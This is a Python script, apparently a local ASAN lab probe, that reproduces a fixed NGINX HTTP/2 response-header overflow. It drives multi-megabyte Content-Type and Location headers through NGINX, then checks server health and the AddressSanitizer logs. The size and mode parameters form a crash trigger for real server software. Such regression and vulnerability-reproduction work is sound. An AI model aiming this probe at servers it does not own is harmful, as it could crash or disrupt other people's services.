#!/usr/bin/env python3
"""HTTP/2 response header length overflow probe for local ASAN labs.

This exercises the source-fixed issue from NGINX commit 58a7bc340.  It sends
ordinary client HTTP/2 requests to NGINX while the local backend returns very
large special response headers.
"""

from __future__ import annotations

import argparse
import re
import subprocess
import sys
import urllib.parse
from dataclasses import dataclass


ASAN_RE = re.compile(rb"(AddressSanitizer|runtime error|ERROR:)")


@dataclass(frozen=True)
class Case:
    mode: str
    size: int
    fill: str
    pass_special: bool
    special_size: int


def split_target(value: str, fallback_port: int) -> tuple[str, int]:
    if "://" in value:
        parsed = urllib.parse.urlparse(value)
        return parsed.hostname or "127.0.0.1", parsed.port or fallback_port

    if ":" in value.rsplit("@", 1)[-1]:
        host, port = value.rsplit(":", 1)
        return host, int(port)

    return value, fallback_port


def docker_logs(container: str | None) -> bytes:
    if not container:
        return b""

    try:
        proc = subprocess.run(
            ["docker", "logs", container],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            check=False,
        )
    except OSError:
        return b""

    return proc.stdout


def curl_h2(url: str, timeout: float) -> tuple[int, str, str]:
    proc = subprocess.run(
        [
            "curl",
            "--http2-prior-knowledge",
            "-sS",
            "-o",
            "/dev/null",
            "-w",
            "code=%{http_code} bytes=%{size_download} err=%{errormsg}",
            "--max-time",
            str(timeout),
            url,
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )
    return (
        proc.returncode,
        proc.stdout.decode("utf-8", "replace"),
        proc.stderr.decode("utf-8", "replace"),
    )


def healthy(host: str, port: int, timeout: float) -> bool:
    rc, out, _err = curl_h2(f"http://{host}:{port}/", timeout)
    return rc == 0 and "code=200" in out


def make_url(host: str, port: int, base_path: str, case: Case) -> str:
    query = {
        "case": "raw-gen",
        "mode": case.mode,
        "size": str(case.size),
        "fill": case.fill,
    }

    if case.pass_special:
        query.update(
            {
                "pass_special": "1",
                "special_size": str(case.special_size),
                "special_fill": case.fill,
            }
        )

    return f"http://{host}:{port}{base_path}?{urllib.parse.urlencode(query)}"


def parse_sizes(value: str) -> list[int]:
    return [int(item, 0) for item in value.split(",") if item.strip()]


def run(args: argparse.Namespace) -> int:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(line_buffering=True)

    host, port = split_target(args.target, args.port)
    sizes = parse_sizes(args.sizes)
    fills = list(args.fills)
    modes = [mode.strip() for mode in args.modes.split(",") if mode.strip()]
    start_logs = docker_logs(args.container)

    print(f"target      {host}:{port}")
    print(f"path        {args.path}")
    print(f"sizes       {','.join(str(size) for size in sizes)}")
    print(f"fills       {args.fills}")
    print(f"modes       {','.join(modes)}")
    print("scope       client HTTP/2 to NGINX; local ASAN log check only")
    print("columns     mode size fill special rc curl health")

    if not healthy(host, port, args.timeout):
        print("preflight   failed")
        return 2

    suspicious = 0

    for mode in modes:
        for size in sizes:
            for fill in fills:
                for pass_special in args.special_modes:
                    case = Case(
                        mode=mode,
                        size=size,
                        fill=fill,
                        pass_special=pass_special,
                        special_size=args.special_size,
                    )
                    url = make_url(host, port, args.path, case)
                    rc, out, err = curl_h2(url, args.timeout)
                    is_up = healthy(host, port, args.timeout)
                    label = "pass" if pass_special else "generated"
                    line = err.strip() or out.strip()
                    print(f"{mode:<27} {size:<9} {fill:<4} {label:<9} {rc:<3} {line:<45} {'up' if is_up else 'down'}")

                    if not is_up or rc in args.suspicious_rc:
                        suspicious += 1

                    if args.stop_on_suspicious and suspicious:
                        break
                if args.stop_on_suspicious and suspicious:
                    break
            if args.stop_on_suspicious and suspicious:
                break
        if args.stop_on_suspicious and suspicious:
            break

    if args.container:
        end_logs = docker_logs(args.container)
        delta = end_logs[len(start_logs) :] if end_logs.startswith(start_logs) else end_logs
        print(f"asan_log_bytes {len(delta)}")
        if ASAN_RE.search(delta):
            print("asan_status found")
            suspicious += 1
        else:
            print("asan_status clean")

    print(f"summary     suspicious={suspicious}")
    return 1 if suspicious else 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Probe NGINX HTTP/2 large response special-header overflow in ASAN lab.")
    parser.add_argument("--target", default="127.0.0.1:19361", help="HOST:PORT or URL")
    parser.add_argument("--port", type=int, default=19361)
    parser.add_argument("--path", default="/h2-header-pass-special")
    parser.add_argument("--modes", default="huge-content-type,huge-content-type-empty,huge-location-absolute")
    parser.add_argument("--sizes", default="2097279,3145728,4194304")
    parser.add_argument("--fills", default="~}|")
    parser.add_argument("--special-size", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--container", help="optional Docker container name for ASAN log detection")
    parser.add_argument("--include-generated", action="store_true", help="also test without upstream Date/Server pass-through")
    parser.add_argument("--stop-on-suspicious", action="store_true")
    args = parser.parse_args()
    args.special_modes = [True]
    if args.include_generated:
        args.special_modes.insert(0, False)
    args.suspicious_rc = {52, 56, 92}
    return args


if __name__ == "__main__":
    raise SystemExit(run(build_parser()))
